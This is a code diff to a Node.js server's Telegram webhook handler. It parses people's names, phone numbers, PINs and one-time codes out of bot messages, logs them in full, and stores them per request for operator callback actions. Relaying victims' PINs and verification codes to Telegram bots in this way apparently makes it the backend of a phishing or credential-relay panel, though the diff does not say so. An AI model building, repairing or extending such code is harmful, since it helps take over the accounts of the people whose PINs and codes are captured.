@@ -130,19 +130,49 @@ function unesc(str) {
 }
 
 // ============================================================
-// ✅ FIXED: Telegram strips <b>/<code> tags out of message.text
-//    and puts them into message.entities. So we must parse the
-//    PLAIN rendered text, not the HTML source.
+// ✅ Telegram strips <b>/<code> from message.text and moves the
+//    formatting into message.entities. Parse the PLAIN text.
+//    Line-by-line so labels must start a line; tolerant of
+//    NBSP padding, stray tags, extra spaces, and casing.
 // ============================================================
 function parseIdentityFromMessage(text) {
     const out = { name: null, phone: null, pin: null, code: null };
     if (!text) return out;
-    let m;
-    if ((m = text.match(/^Name:\s+(.*)$/m)))  out.name  = stripPad(m[1]);
-    if ((m = text.match(/^Phone:\s+(.*)$/m))) out.phone = stripPad(m[1]);
-    if ((m = text.match(/^PIN:\s+(.*)$/m)))   out.pin   = stripPad(m[1]);
-    if ((m = text.match(/^Code:\s+(.*)$/m)))  out.code  = stripPad(m[1]);
+    const lines = String(text).split(/\r?\n/);
+    for (const raw of lines) {
+        const line = raw
+            .replace(/\u00A0/g, ' ')
+            .replace(/<\/?[^>]+>/g, '')
+            .trim();
+        let m;
+        if ((m = line.match(/^Name\s*:\s*(.+)$/i))  && m[1].trim()) out.name  = m[1].trim();
+        else if ((m = line.match(/^Phone\s*:\s*(.+)$/i)) && m[1].trim()) out.phone = m[1].trim();
+        else if ((m = line.match(/^PIN\s*:\s*(.+)$/i))   && m[1].trim()) out.pin   = m[1].trim();
+        else if ((m = line.match(/^Code\s*:\s*(.+)$/i))  && m[1].trim()) out.code  = m[1].trim();
+    }
     return out;
+}
+
+// ============================================================
+// ✅ "Unknown" must never win over a real value. Pick the first
+//    non-empty, non-"Unknown" candidate.
+// ============================================================
+function pickValue(...candidates) {
+    for (const c of candidates) {
+        if (c === null || c === undefined) continue;
+        const s = String(c).trim();
+        if (s && s !== 'Unknown') return s;
+    }
+    return 'Unknown';
+}
+
+function pickOptional(...candidates) {
+    for (const c of candidates) {
+        if (c === null || c === undefined) continue;
+        const s = String(c).trim();
+        if (s && s !== 'Unknown') return s;
+    }
+    return '';
 }
 
 function withIdentity(header, name, phone, extraLines = []) {
@@ -505,23 +535,38 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
         const meta    = requestBotMap[requestId] || {};
         const fromMsg = parseIdentityFromMessage(cb.message?.text);
 
-        const name  = meta.name  || fromMsg.name  || 'Unknown';
-        const phone = meta.phone || fromMsg.phone || 'Unknown';
-        const pin   = meta.pin   ?? fromMsg.pin   ?? '';
-        const code  = meta.code  ?? fromMsg.code  ?? '';
+        // 🔎 Debug: shows exactly what Telegram handed us
+        console.log('🔎 msg.text =', JSON.stringify(cb.message?.text || ''));
+        console.log('🔎 meta    =', JSON.stringify({
+            name: meta.name, phone: meta.phone, pin: meta.pin, code: meta.code
+        }));
+        console.log('🔎 fromMsg =', JSON.stringify(fromMsg));
 
-        if (!requestBotMap[requestId] && (fromMsg.name || fromMsg.phone)) {
+        // ✅ "Unknown" is never a real value — it's a placeholder.
+        const name  = pickValue(meta.name,  fromMsg.name);
+        const phone = pickValue(meta.phone, fromMsg.phone);
+        const pin   = pickOptional(meta.pin,  fromMsg.pin);
+        const code  = pickOptional(meta.code, fromMsg.code);
+
+        // Rebuild whenever the map entry is missing OR was poisoned with "Unknown"
+        const metaPoisoned =
+            !requestBotMap[requestId] ||
+            requestBotMap[requestId].name  === 'Unknown' ||
+            requestBotMap[requestId].phone === 'Unknown';
+
+        if (metaPoisoned && (fromMsg.name || fromMsg.phone)) {
             requestBotMap[requestId] = {
                 botId: bot.botId,
-                name,
-                phone,
-                pin:  fromMsg.pin  || undefined,
-                code: fromMsg.code || undefined,
+                name:  fromMsg.name  || name,
+                phone: fromMsg.phone || phone,
+                pin:   fromMsg.pin   || undefined,
+                code:  fromMsg.code  || undefined,
                 type: action.split('_')[0],
                 createdAt: Date.now()
             };
             saveStore();
-            console.log('♻️ Rebuilt requestBotMap from message for', requestId);
+            console.log('♻️ Rebuilt requestBotMap for', requestId,
+                        '→', requestBotMap[requestId].name, '/', requestBotMap[requestId].phone);
         }
 
         // ============================================================
